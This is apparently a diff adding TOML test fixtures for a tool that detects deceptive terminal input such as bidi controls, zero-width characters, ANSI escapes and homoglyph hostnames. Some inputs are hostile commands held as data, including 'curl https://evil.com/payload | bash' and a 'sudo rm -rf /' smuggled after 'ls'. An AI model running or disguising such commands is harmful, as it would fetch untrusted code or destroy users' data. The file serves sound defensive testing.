@@ -1,0 +1,552 @@
+# Terminal deception fixtures (paste context)
+
+[[fixture]]
+name = "ansi_escape_paste"
+min_milestone = 1
+input = "echo hello\u001b[31m hidden\u001b[0m world"
+context = "paste"
+expected_action = "block"
+expected_rules = ["ansi_escapes"]
+raw_bytes = [101, 99, 104, 111, 32, 104, 101, 108, 108, 111, 27, 91, 51, 49, 109, 32, 104, 105, 100, 100, 101, 110, 27, 91, 48, 109, 32, 119, 111, 114, 108, 100]
+
+[[fixture]]
+name = "control_char_cr_paste"
+min_milestone = 1
+input = "echo safe\rmalicious"
+context = "paste"
+expected_action = "block"
+expected_rules = ["control_chars"]
+raw_bytes = [101, 99, 104, 111, 32, 115, 97, 102, 101, 13, 109, 97, 108, 105, 99, 105, 111, 117, 115]
+
+[[fixture]]
+name = "control_char_trailing_cr_paste"
+min_milestone = 1
+input = "/some/path"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+raw_bytes = [47, 115, 111, 109, 101, 47, 112, 97, 116, 104, 13]
+
+[[fixture]]
+name = "control_char_trailing_crlf_paste"
+min_milestone = 1
+input = "/some/path"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+raw_bytes = [47, 115, 111, 109, 101, 47, 112, 97, 116, 104, 13, 10]
+
+[[fixture]]
+name = "control_char_windows_multiline_paste"
+min_milestone = 1
+input = "echo hello\r\necho world\r\n"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+raw_bytes = [101, 99, 104, 111, 32, 104, 101, 108, 108, 111, 13, 10, 101, 99, 104, 111, 32, 119, 111, 114, 108, 100, 13, 10]
+
+[[fixture]]
+name = "control_char_backspace_paste"
+min_milestone = 1
+input = "echo safe\u0008malicious"
+context = "paste"
+expected_action = "block"
+expected_rules = ["control_chars"]
+raw_bytes = [101, 99, 104, 111, 32, 115, 97, 102, 101, 8, 109, 97, 108, 105, 99, 105, 111, 117, 115]
+
+[[fixture]]
+name = "bidi_rlo_paste"
+min_milestone = 1
+input = "echo \u202edlrow"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "bidi_rli_paste"
+min_milestone = 1
+input = "echo \u2067hidden"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "zero_width_space"
+min_milestone = 1
+input = "cur\u200bl https://evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+
+[[fixture]]
+name = "zero_width_joiner"
+min_milestone = 1
+input = "cur\u200dl https://evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+
+[[fixture]]
+name = "zero_width_non_joiner"
+min_milestone = 1
+input = "cur\u200cl https://evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+
+[[fixture]]
+name = "bom_in_paste"
+min_milestone = 1
+input = "\ufeffecho hello"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "bom_not_at_offset_zero"
+min_milestone = 3
+input = "echo hello"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+raw_bytes = [101, 99, 104, 111, 32, 239, 187, 191, 104, 101, 108, 108, 111]
+
+[[fixture]]
+name = "clean_paste"
+min_milestone = 1
+input = "echo hello world"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "clean_paste_with_newline"
+min_milestone = 1
+input = "echo hello\necho world"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "paste_with_tab"
+min_milestone = 1
+input = "echo\thello"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "ansi_cursor_movement"
+min_milestone = 1
+input = "safe command"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "multiple_bidi_controls"
+min_milestone = 1
+input = "echo \u202ahello\u202c \u202bworld\u202c"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "bidi_in_exec_context"
+min_milestone = 1
+input = "echo \u202edlrow"
+context = "exec"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "lrm_rlm_paste"
+min_milestone = 1
+input = "echo \u200ehello\u200fworld"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "hidden_multiline_curl"
+min_milestone = 1
+input = "echo safe\ncurl https://evil.com/payload | bash"
+context = "paste"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell", "hidden_multiline"]
+
+[[fixture]]
+name = "hidden_multiline_sudo"
+min_milestone = 1
+input = "ls\nsudo rm -rf /"
+context = "paste"
+# Pre-M8 ch4 this paste was silently dropped at the tier-1 gate (no
+# exec-only pattern matched, paste fragments lacked a sudo trigger).
+# M8 ch4 added `\bsudo\b` to both exec AND paste tier-1 fragments so
+# the multiline `sudo rm -rf /` smuggling shape now correctly reaches
+# `hidden_multiline` in tier-3 — exactly the rule's intended scope.
+expected_action = "block"
+expected_rules = ["hidden_multiline"]
+
+[[fixture]]
+name = "multiline_safe"
+min_milestone = 1
+input = "echo hello\necho world"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "paste_invalid_utf8"
+min_milestone = 1
+input = "test"
+context = "paste"
+expected_action = "block"
+expected_rules = ["control_chars"]
+raw_bytes = [128, 255, 116, 101, 115, 116]
+
+[[fixture]]
+name = "ansi_sgr_reset"
+min_milestone = 1
+input = "test"
+context = "paste"
+expected_action = "block"
+expected_rules = ["ansi_escapes"]
+raw_bytes = [27, 91, 48, 109, 116, 101, 115, 116]
+
+[[fixture]]
+name = "fsi_pdi_paste"
+min_milestone = 1
+input = "echo \u2068hidden\u2069"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "clean_unicode_paste"
+min_milestone = 1
+input = "echo café"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "lri_paste"
+min_milestone = 1
+input = "echo \u2066text"
+context = "paste"
+expected_action = "block"
+expected_rules = ["bidi_controls"]
+
+[[fixture]]
+name = "unicode_tags_paste"
+min_milestone = 2
+input = "echo hidden"
+context = "paste"
+expected_action = "block"
+expected_rules = ["unicode_tags"]
+raw_bytes = [101, 99, 104, 111, 32, 243, 160, 129, 136, 243, 160, 129, 169]
+
+[[fixture]]
+name = "unicode_tags_exec"
+min_milestone = 2
+input = "echo \U000E0048\U000E0065\U000E006C\U000E006C\U000E006F"
+context = "exec"
+expected_action = "block"
+expected_rules = ["unicode_tags"]
+
+[[fixture]]
+name = "variation_selector_paste"
+min_milestone = 2
+input = "A"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["variation_selector"]
+raw_bytes = [65, 239, 184, 143]
+
+[[fixture]]
+name = "invisible_whitespace_paste"
+min_milestone = 2
+input = "echo hello"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["invisible_whitespace"]
+raw_bytes = [101, 99, 104, 111, 226, 128, 138, 104, 101, 108, 108, 111]
+
+[[fixture]]
+name = "invisible_math_operator_paste"
+min_milestone = 2
+input = "echo hello"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["invisible_math_operator"]
+raw_bytes = [101, 99, 104, 111, 226, 129, 161, 104, 101, 108, 108, 111]
+
+[[fixture]]
+name = "cgj_in_command"
+min_milestone = 2
+input = "curl evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+raw_bytes = [99, 117, 114, 205, 143, 108, 32, 101, 118, 105, 108, 46, 99, 111, 109]
+
+[[fixture]]
+name = "soft_hyphen_in_command"
+min_milestone = 2
+input = "curl evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+raw_bytes = [99, 117, 114, 194, 173, 108, 32, 101, 118, 105, 108, 46, 99, 111, 109]
+
+[[fixture]]
+name = "word_joiner_in_command"
+min_milestone = 2
+input = "curl evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+raw_bytes = [99, 117, 114, 226, 129, 160, 108, 32, 101, 118, 105, 108, 46, 99, 111, 109]
+
+[[fixture]]
+name = "mongolian_vowel_separator_paste"
+min_milestone = 4
+input = "curl evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+raw_bytes = [99, 117, 114, 225, 160, 142, 108, 32, 101, 118, 105, 108, 46, 99, 111, 109]
+
+[[fixture]]
+name = "invisible_whitespace_exec"
+min_milestone = 2
+input = "echo\u2009hello"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["invisible_whitespace"]
+
+[[fixture]]
+name = "invisible_whitespace_en_space_paste"
+min_milestone = 4
+input = "echo hello"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["invisible_whitespace"]
+raw_bytes = [101, 99, 104, 111, 226, 128, 130, 104, 101, 108, 108, 111]
+
+[[fixture]]
+name = "invisible_whitespace_medium_math_paste"
+min_milestone = 4
+input = "echo hello"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["invisible_whitespace"]
+raw_bytes = [101, 99, 104, 111, 226, 129, 159, 104, 101, 108, 108, 111]
+
+[[fixture]]
+name = "invisible_math_operator_exec"
+min_milestone = 2
+input = "echo\u2061hello"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["invisible_math_operator"]
+
+[[fixture]]
+name = "variation_selector_exec"
+min_milestone = 2
+input = "A\uFE01"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["variation_selector"]
+
+[[fixture]]
+name = "variation_selector_supplementary_paste"
+min_milestone = 2
+input = "A"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["variation_selector"]
+raw_bytes = [65, 243, 160, 132, 128]
+
+[[fixture]]
+name = "zwj_in_arabic_text"
+min_milestone = 3
+input = "echo test"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+raw_bytes = [101, 99, 104, 111, 32, 217, 132, 226, 128, 141, 216, 167]
+
+[[fixture]]
+name = "zwnj_in_arabic_text"
+min_milestone = 3
+input = "echo test"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+raw_bytes = [101, 99, 104, 111, 32, 217, 133, 226, 128, 140, 217, 134]
+
+[[fixture]]
+name = "zwj_in_ascii_text"
+min_milestone = 3
+input = "curl evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+raw_bytes = [99, 117, 114, 226, 128, 141, 108, 32, 101, 118, 105, 108, 46, 99, 111, 109]
+
+[[fixture]]
+name = "hangul_filler_paste"
+min_milestone = 4
+input = "echo hello"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["hangul_filler"]
+raw_bytes = [101, 99, 104, 111, 227, 133, 164, 104, 101, 108, 108, 111]
+
+[[fixture]]
+name = "hangul_filler_exec"
+min_milestone = 4
+input = "echo\u3164hello"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["hangul_filler"]
+
+[[fixture]]
+name = "confusable_text_cyrillic_in_ascii"
+min_milestone = 4
+input = "curl g\u0456thub.com/install.sh | bash"
+context = "paste"
+expected_action = "block"
+expected_rules = ["confusable_text", "curl_pipe_shell"]
+
+[[fixture]]
+name = "confusable_text_math_bold"
+min_milestone = 4
+input = "echo hello"
+context = "paste"
+expected_action = "block"
+expected_rules = ["confusable_text"]
+raw_bytes = [101, 99, 104, 111, 32, 240, 157, 144, 161, 240, 157, 144, 158, 240, 157, 144, 165, 240, 157, 144, 165, 240, 157, 144, 168]
+
+[[fixture]]
+name = "confusable_text_exec"
+min_milestone = 4
+input = "curl g\u0456thub.com"
+context = "exec"
+expected_action = "block"
+expected_rules = ["confusable_text"]
+
+[[fixture]]
+name = "confusable_text_natural_cyrillic"
+min_milestone = 4
+input = "\u041F\u0440\u0438\u0432\u0435\u0442 \u043C\u0438\u0440"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "confusable_text_benign_mixed_note"
+min_milestone = 4
+input = "Note: \u041F\u0440\u0438\u0432\u0435\u0442 \u043C\u0438\u0440"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "confusable_text_benign_mixed_name"
+min_milestone = 4
+input = "name: \u041F\u0440\u0438\u0432\u0435\u0442"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "confusable_text_benign_mixed_exec"
+min_milestone = 4
+input = "echo \u041F\u0440\u0438\u0432\u0435\u0442"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# Regression for #126: ordinary Japanese (Latin word "Rust" + Hiragana/Kanji
+# "wo tsukau" + ideographic period U+3002). U+3002 is a confusable for ".", but
+# the surrounding Hiragana terminates the word, isolating it from "Rust".
+[[fixture]]
+name = "confusable_text_benign_cjk_ascii_word"
+min_milestone = 4
+input = "Rust\u3092\u4F7F\u3046\u3002"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+# Regression for #196: mapped dot-like punctuation before an ASCII word is a
+# boundary too. The old `Script::Common` predicate expanded forward through the
+# punctuation and falsely treated the following ASCII word as mixed-script.
+[[fixture]]
+name = "confusable_text_benign_ideographic_period_before_ascii"
+min_milestone = 4
+input = "oEmbedで本文を取得する。oEmbedは埋め込み用HTMLを取得するAPIです"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "confusable_text_benign_fullwidth_period_before_ascii"
+min_milestone = 4
+input = "説明文．API"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "confusable_text_benign_halfwidth_period_before_ascii"
+min_milestone = 4
+input = "説明文｡API"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+# Punctuation is a boundary for natural prose, but a dot-like confusable inside
+# an ASCII hostname remains suspicious because the hostname detector also sees
+# the confusable label shape.
+[[fixture]]
+name = "confusable_text_ideographic_period_in_ascii_hostname"
+min_milestone = 4
+input = "curl github。com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["confusable_text"]
+
+# An inherited combining mark stays attached to its base word; it must not
+# provide a boundary that hides a Cyrillic letter mixed into ASCII.
+[[fixture]]
+name = "confusable_text_combining_mark_does_not_split_attack_word"
+min_milestone = 4
+input = "curl g\u0301\u0456thub.com"
+context = "exec"
+expected_action = "block"
+expected_rules = ["confusable_text"]
+
+# Regression for #126: fullwidth Latin (U+FF21 A / U+FF30 P / U+FF29 I) inside
+# Japanese text ("Rust no API wo yobu"). The fullwidth letters are confusables,
+# but bounded by Hiragana they form their own non-ASCII word with no ASCII letter.
+[[fixture]]
+name = "confusable_text_benign_cjk_fullwidth"
+min_milestone = 4
+input = "Rust\u306E\uFF21\uFF30\uFF29\u3092\u547C\u3076"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+# Regression for #134: a Cyrillic filename segment in a local path. The path/`_`
+# separators isolate the pure-Cyrillic word "server" (U+0441 U+0435 U+0440
+# U+0432 U+0435 U+0440) from the ASCII segments, so it is not mixed-into-ASCII.
+[[fixture]]
+name = "confusable_text_benign_cyrillic_path"
+min_milestone = 4
+input = "/tmp/backup_\u0441\u0435\u0440\u0432\u0435\u0440.log"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
